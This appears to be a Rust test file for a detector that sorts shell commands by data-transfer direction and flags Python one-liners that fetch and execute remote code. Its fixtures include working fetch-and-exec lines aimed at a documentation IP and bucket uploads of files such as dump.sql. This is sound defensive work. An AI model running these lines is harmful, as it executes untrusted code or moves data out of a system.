use super::{Client, Direction, Operation, Reading, Transfer, transfers};

fn words(command: &str) -> Vec<String> {
    command.split_whitespace().map(str::to_owned).collect()
}

fn transfer<'a>(
    client: Client,
    operation: Operation,
    source: &'a str,
    destination: &'a str,
    direction: Direction,
) -> Transfer<'a> {
    Transfer {
        client,
        operation,
        source,
        destination,
        direction,
        reading: Reading::Certain,
        endpoint_override: false,
    }
}

#[test]
fn aws_s3_copy_move_and_sync_from_a_local_source_are_outbound() {
    assert_eq!(
        transfers(&words("aws s3 cp dump.sql s3://synthetic-bucket/")),
        [transfer(
            Client::Aws,
            Operation::Copy,
            "dump.sql",
            "s3://synthetic-bucket/",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words("aws s3 mv dump.sql s3://synthetic-bucket/")),
        [transfer(
            Client::Aws,
            Operation::Move,
            "dump.sql",
            "s3://synthetic-bucket/",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words(
            "aws --profile fixture s3 sync --exclude *.tmp ./dist s3://synthetic-bucket/site/"
        )),
        // A profile can set the endpoint.
        [Transfer {
            endpoint_override: true,
            ..transfer(
                Client::Aws,
                Operation::Sync,
                "./dist",
                "s3://synthetic-bucket/site/",
                Direction::Outbound,
            )
        }]
    );
}

#[test]
fn object_storage_from_a_remote_source_is_inbound_or_remote() {
    assert_eq!(
        transfers(&words(
            "aws s3 cp --profile prod s3://synthetic-bucket/a ./a"
        )),
        [Transfer {
            endpoint_override: true,
            ..transfer(
                Client::Aws,
                Operation::Copy,
                "s3://synthetic-bucket/a",
                "./a",
                Direction::Inbound,
            )
        }]
    );
    assert_eq!(
        transfers(&words(
            "aws s3 sync s3://synthetic-bucket/site s3://other-bucket/site"
        )),
        [transfer(
            Client::Aws,
            Operation::Sync,
            "s3://synthetic-bucket/site",
            "s3://other-bucket/site",
            Direction::Remote
        )]
    );
    assert_eq!(
        transfers(&words("gsutil mv gs://synthetic-bucket/a.tar .")),
        [transfer(
            Client::Gsutil,
            Operation::Move,
            "gs://synthetic-bucket/a.tar",
            ".",
            Direction::Inbound
        )]
    );
    assert_eq!(
        transfers(&words(
            "rclone move synthetic-remote:archive other-remote:archive"
        )),
        [transfer(
            Client::Rclone,
            Operation::Move,
            "synthetic-remote:archive",
            "other-remote:archive",
            Direction::Remote
        )]
    );
}

#[test]
fn gsutil_and_rclone_verbs_map_to_copy_move_and_sync() {
    assert_eq!(
        transfers(&words(
            "gsutil -m rsync -d -r ./dist gs://synthetic-bucket/site"
        )),
        [transfer(
            Client::Gsutil,
            Operation::Sync,
            "./dist",
            "gs://synthetic-bucket/site",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words(
            "gsutil -u fixture-project cp gs://synthetic-bucket/a ./a"
        )),
        [transfer(
            Client::Gsutil,
            Operation::Copy,
            "gs://synthetic-bucket/a",
            "./a",
            Direction::Inbound
        )]
    );
    assert_eq!(
        transfers(&words("rclone copyto ./a synthetic-remote:b/a")),
        [transfer(
            Client::Rclone,
            Operation::Copy,
            "./a",
            "synthetic-remote:b/a",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words("rclone sync -P synthetic-remote:archive ./reports")),
        [transfer(
            Client::Rclone,
            Operation::Sync,
            "synthetic-remote:archive",
            "./reports",
            Direction::Inbound
        )]
    );
}

#[test]
fn the_client_is_read_behind_wrappers_assignments_and_an_exe_suffix() {
    assert_eq!(
        transfers(&words(
            "AWS_PROFILE=fixture sudo -u deploy aws.exe s3 cp f s3://synthetic-bucket/"
        )),
        [transfer(
            Client::Aws,
            Operation::Copy,
            "f",
            "s3://synthetic-bucket/",
            Direction::Outbound
        )]
    );
}

#[test]
fn a_transfer_run_on_a_remote_host_or_in_a_container_is_read() {
    let upload = |source| {
        [transfer(
            Client::Aws,
            Operation::Copy,
            source,
            "s3://synthetic-bucket/k",
            Direction::Outbound,
        )]
    };
    for command in [
        "ssh host aws s3 cp ./d s3://synthetic-bucket/k",
        "ssh -p 2222 -i key -o BatchMode=yes user@host aws s3 cp ./d s3://synthetic-bucket/k",
        "ssh -t host -- aws s3 cp ./d s3://synthetic-bucket/k",
        "sudo -u app ssh host aws s3 cp ./d s3://synthetic-bucket/k",
        "docker exec c aws s3 cp ./d s3://synthetic-bucket/k",
        "docker exec -it -u root --env-file vars c aws s3 cp ./d s3://synthetic-bucket/k",
        "podman exec -w /srv c aws s3 cp ./d s3://synthetic-bucket/k",
        "kubectl exec pod -- aws s3 cp ./d s3://synthetic-bucket/k",
        "kubectl exec -n ns pod -c ctr -- aws s3 cp ./d s3://synthetic-bucket/k",
        "aws-vault exec prod -- aws s3 cp ./d s3://synthetic-bucket/k",
        "aws-vault exec -d 1h prod aws s3 cp ./d s3://synthetic-bucket/k",
    ] {
        assert_eq!(transfers(&words(command)), upload("./d"), "{command}");
    }
}

#[test]
fn a_transfer_a_runner_or_another_shell_starts_is_read() {
    let upload = |source| {
        [transfer(
            Client::Aws,
            Operation::Copy,
            source,
            "s3://synthetic-bucket/k",
            Direction::Outbound,
        )]
    };
    for (command, source) in [
        ("watch -n5 aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
        ("watch -n 5 -d aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
        (
            "parallel -j 4 aws s3 cp {} s3://synthetic-bucket/k ::: *.gz",
            "{}",
        ),
        ("uv run aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
        (
            "uv run --with awscli aws s3 cp ./d s3://synthetic-bucket/k",
            "./d",
        ),
        ("npx --yes aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
        ("cmd /c aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
        (
            "cmd.exe /d /s /C aws s3 cp ./d s3://synthetic-bucket/k",
            "./d",
        ),
        (
            "powershell -NoProfile -Command aws s3 cp ./d s3://synthetic-bucket/k",
            "./d",
        ),
        ("pwsh -c aws s3 cp ./d s3://synthetic-bucket/k", "./d"),
    ] {
        assert_eq!(transfers(&words(command)), upload(source), "{command}");
    }
}

#[test]
fn a_transfer_in_a_group_or_a_function_body_is_read() {
    for command in [
        "{ aws s3 cp ./d s3://synthetic-bucket/k",
        "f() { aws s3 cp ./d s3://synthetic-bucket/k",
        "f () { aws s3 cp ./d s3://synthetic-bucket/k",
        "function f { aws s3 cp ./d s3://synthetic-bucket/k",
    ] {
        assert_eq!(
            transfers(&words(command)),
            [transfer(
                Client::Aws,
                Operation::Copy,
                "./d",
                "s3://synthetic-bucket/k",
                Direction::Outbound
            )],
            "{command}"
        );
    }
}

#[test]
fn a_launcher_reads_the_direction_and_command_it_runs() {
    assert_eq!(
        transfers(&words("ssh host aws s3 cp s3://synthetic-bucket/k ./d")),
        [transfer(
            Client::Aws,
            Operation::Copy,
            "s3://synthetic-bucket/k",
            "./d",
            Direction::Inbound
        )]
    );
    assert_eq!(
        transfers(&words(
            "ssh host echo aws s3 cp ./d s3://synthetic-bucket/k"
        )),
        []
    );
    assert_eq!(transfers(&words("docker exec c grep aws s3 cp f")), []);
    assert_eq!(
        transfers(&words(
            "kubectl exec pod -- echo aws s3 cp ./d s3://synthetic-bucket/k"
        )),
        []
    );
    assert_eq!(
        transfers(&words(
            "watch -n5 echo aws s3 cp ./d s3://synthetic-bucket/k"
        )),
        []
    );
}

#[test]
fn a_quoted_command_another_shell_receives_is_its_script() {
    let quoted = |words: &[&str]| {
        words
            .iter()
            .map(|word| (*word).to_owned())
            .collect::<Vec<_>>()
    };
    let ssh = quoted(&[
        "ssh",
        "-p",
        "2222",
        "host",
        "cd /srv && aws s3 cp ./d s3://b/",
    ]);
    assert_eq!(
        super::launched_script(&ssh),
        Some((&ssh[..4], "cd /srv && aws s3 cp ./d s3://b/".to_owned()))
    );
    assert_eq!(
        super::launched_script(&quoted(&[
            "sudo",
            "-u",
            "app",
            "cmd",
            "/c",
            "aws s3 cp ./d s3://b/"
        ])),
        Some((&[][..], "aws s3 cp ./d s3://b/".to_owned()))
    );
    assert_eq!(
        super::launched_script(&quoted(&[
            "powershell",
            "-NoProfile",
            "-Command",
            "aws s3 cp ./d s3://b/"
        ])),
        Some((&[][..], "aws s3 cp ./d s3://b/".to_owned()))
    );
    assert_eq!(
        super::launched_script(&quoted(&["ssh", "host", "aws", "s3", "ls"])),
        None
    );
    assert_eq!(
        super::launched_script(&quoted(&["docker", "exec", "c", "aws s3 cp ./d s3://b/"])),
        None
    );
    // cmd keeps the quotes inside its command line: only a quoted
    // command of its own is a script.
    assert_eq!(
        super::launched_script(&quoted(&["cmd", "/c", "echo", "x & aws s3 cp ./d s3://b/"])),
        None
    );
}

/// Shell words: the launcher words, then the code as one word.
fn one_liner(launcher: &str, code: &str) -> Vec<String> {
    let mut tokens = words(launcher);
    tokens.push(code.to_owned());
    tokens
}

fn fetched(url: &str, elsewhere: bool) -> Option<super::FetchedCode<'_>> {
    Some(super::FetchedCode { url, elsewhere })
}

#[test]
fn a_python_one_liner_that_runs_a_fetched_response_reads_its_url() {
    let tokens = one_liner(
        "python3 -c",
        "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())",
    );
    assert_eq!(
        super::fetched_code(&tokens),
        fetched("https://203.0.113.10/x.py", false)
    );
}

#[test]
fn a_fetched_text_or_a_name_bound_to_it_is_read_as_the_code() {
    for (launcher, code) in [
        (
            "python -c",
            "import requests; u='https://203.0.113.10/x.py'; exec(requests.get(u).text)",
        ),
        (
            "py -3 -c",
            "import requests; r = requests.get(\"https://203.0.113.10/x.py\"); exec(r.text)",
        ),
        (
            "python3.12 -I -c",
            "from urllib.request import urlopen\nc = urlopen('https://203.0.113.10/x.py').read().decode()\nexec(c)",
        ),
        (
            "python3 -c",
            "import httpx; exec(compile(httpx.get('https://203.0.113.10/x.py').content, 'x', 'exec'))",
        ),
        (
            "python3 -c",
            "import requests;eval(requests.post('https://203.0.113.10/x.py', data={}).text)",
        ),
        (
            "sudo -u deploy env A=1 python3 -c",
            "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())",
        ),
    ] {
        assert_eq!(
            super::fetched_code(&one_liner(launcher, code)),
            fetched("https://203.0.113.10/x.py", false),
            "{launcher} {code}"
        );
    }
}

#[test]
fn a_one_liner_another_host_or_a_container_runs_is_elsewhere() {
    let code =
        "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())";
    for launcher in ["ssh host python3 -c", "docker exec c python3 -c"] {
        assert_eq!(
            super::fetched_code(&one_liner(launcher, code)),
            fetched("https://203.0.113.10/x.py", true),
            "{launcher}"
        );
    }
}

#[test]
fn a_fetch_whose_response_is_not_run_reads_as_none() {
    for (launcher, code) in [
        (
            "python3 -c",
            "import urllib.request; print(urllib.request.urlopen('https://203.0.113.10/x').status)",
        ),
        (
            "python3 -c",
            "import urllib.request; print(urllib.request.urlopen('https://203.0.113.10/x').read())",
        ),
        (
            "python3 -c",
            "import json, requests; d = json.loads(requests.get('https://203.0.113.10/a.json').text); print(d)",
        ),
        (
            "python3 -c",
            "import requests; open('x.py', 'w').write(requests.get('https://203.0.113.10/x.py').text)",
        ),
        (
            "python3 -c",
            "import requests; requests.get('https://203.0.113.10/x'); exec('print(1)')",
        ),
        (
            "python3 -c",
            "exec(urlopen('https://203.0.113.10/x.py').read())",
        ),
        ("python3 -c", "exec('print(1)')"),
        (
            "python3 -c",
            "import requests; print(requests.get('https://203.0.113.10/x').text + '\\é')",
        ),
        (
            "echo python3 -c",
            "exec(urlopen('https://203.0.113.10/x.py').read())",
        ),
        ("python3 -m", "http.server"),
    ] {
        assert_eq!(
            super::fetched_code(&one_liner(launcher, code)),
            None,
            "{launcher} {code}"
        );
    }
    assert_eq!(
        super::fetched_code(&words("python3 script.py https://203.0.113.10/x.py")),
        None
    );
    assert_eq!(super::fetched_code(&words("pip install requests")), None);
}

#[test]
fn code_that_only_names_a_fetch_and_exec_reads_as_none() {
    for code in [
        "import requests; print(\"exec(requests.get('https://203.0.113.10/x').text)\")",
        "import requests\n# exec(requests.get('https://203.0.113.10/x').text)",
        "import requests; cursor.execute(requests.get('https://203.0.113.10/x').text)",
        "import requests; obj.exec(requests.get('https://203.0.113.10/x').text)",
        "import requests; obj . exec(requests.get('https://203.0.113.10/x').text)",
        "import requests; r = requests.get('https://203.0.113.10/x'); eval(r.status_code)",
        "import my_requests; exec(my_requests.get('https://203.0.113.10/x').text)",
        "import requests; compile(requests.get('https://203.0.113.10/x').text, 'x', 'exec')",
        "import requests; r = requests.get('https://203.0.113.10/x'); s = 'print(1)'; exec(s)",
    ] {
        assert_eq!(
            super::fetched_code(&one_liner("python3 -c", code)),
            None,
            "{code}"
        );
    }
}

#[test]
fn a_name_bound_again_reads_its_last_value() {
    for code in [
        "import requests; r = requests.get('https://203.0.113.10/x'); r = 'print(1)'; exec(r)",
        "import requests; u = 'https://203.0.113.10/x'; u = 'local.txt'; exec(requests.get(u).text)",
    ] {
        assert_eq!(
            super::fetched_code(&one_liner("python3 -c", code)),
            None,
            "{code}"
        );
    }
    assert_eq!(
        super::fetched_code(&one_liner(
            "python3 -c",
            "import requests; r = 'print(1)'; r = requests.get('https://203.0.113.10/x.py'); exec(r.text)",
        )),
        fetched("https://203.0.113.10/x.py", false)
    );
}

#[test]
fn rclone_after_an_unlisted_flag_is_a_fallback_reading() {
    assert_eq!(
        transfers(&words(
            "rclone sync --s3-no-check-bucket ./dump synthetic-remote:b"
        )),
        [Transfer {
            client: Client::Rclone,
            operation: Operation::Sync,
            source: "./dump",
            destination: "synthetic-remote:b",
            direction: Direction::Outbound,
            reading: Reading::Fallback,
            endpoint_override: false,
        }]
    );
}

#[test]
fn an_endpoint_option_marks_the_destination_as_not_naming_its_host() {
    for (command, overridden) in [
        ("aws s3 cp f s3://synthetic-bucket/k", false),
        (
            "aws --endpoint-url https://203.0.113.9 s3 cp f s3://synthetic-bucket/k",
            true,
        ),
        (
            "aws s3 cp --endpoint-url=https://203.0.113.9 f s3://synthetic-bucket/k",
            true,
        ),
        ("aws --profile p s3 cp f s3://synthetic-bucket/k", true),
        ("aws s3 cp f s3://synthetic-bucket/k --profile=p", true),
        ("aws s3 cp f s3://synthetic-bucket/k --profiles-x", false),
        ("gsutil -m cp f gs://synthetic-bucket/k", false),
        (
            "gsutil -o Credentials:gs_json_host=203.0.113.9 cp f gs://synthetic-bucket/k",
            true,
        ),
        (
            "gsutil -mo Boto:proxy=203.0.113.9 cp f gs://synthetic-bucket/k",
            true,
        ),
    ] {
        let words = words(command);
        let transfers = transfers(&words);
        assert_eq!(transfers.len(), 1, "{command}");
        assert_eq!(transfers[0].endpoint_override, overridden, "{command}");
    }
}

#[test]
fn github_cli_publishes_each_body_or_gist_file() {
    assert_eq!(
        transfers(&words(
            "gh -R synthetic/repo issue create --title t --body-file docs/issue.md"
        )),
        [transfer(
            Client::Gh,
            Operation::Publish,
            "docs/issue.md",
            "github:issue",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words("gh pr comment 7 -Fnotes.md")),
        [transfer(
            Client::Gh,
            Operation::Publish,
            "notes.md",
            "github:pr",
            Direction::Outbound
        )]
    );
    assert_eq!(
        transfers(&words("gh gist create --public notes.md setup.md")),
        [
            transfer(
                Client::Gh,
                Operation::Publish,
                "notes.md",
                "github:gist",
                Direction::Outbound
            ),
            transfer(
                Client::Gh,
                Operation::Publish,
                "setup.md",
                "github:gist",
                Direction::Outbound
            ),
        ]
    );
}

#[test]
fn commands_that_request_no_transfer_read_as_none() {
    assert_eq!(transfers(&words("aws s3 ls s3://synthetic-bucket/")), []);
    assert_eq!(transfers(&words("aws s3 cp help")), []);
    assert_eq!(transfers(&words("aws cp x y")), []);
    assert_eq!(
        transfers(&words("echo aws s3 cp ./d s3://synthetic-bucket/")),
        []
    );
    assert_eq!(transfers(&words("gh issue comment 1 --body text")), []);
    assert_eq!(transfers(&words("gh gist view 1234abcd")), []);
    assert_eq!(transfers(&words("rclone ls synthetic-remote:b")), []);
    for command in [
        "ssh",
        "ssh -p",
        "docker exec",
        "kubectl exec pod",
        "cmd",
        "powershell",
        "function",
        "f ()",
        "sudo ssh",
        "pwsh -File x.ps1 -c aws s3 cp ./d s3://synthetic-bucket/k",
        "powershell -f x.ps1 -Command aws s3 cp ./d s3://synthetic-bucket/k",
    ] {
        assert_eq!(transfers(&words(command)), [], "{command}");
    }
}
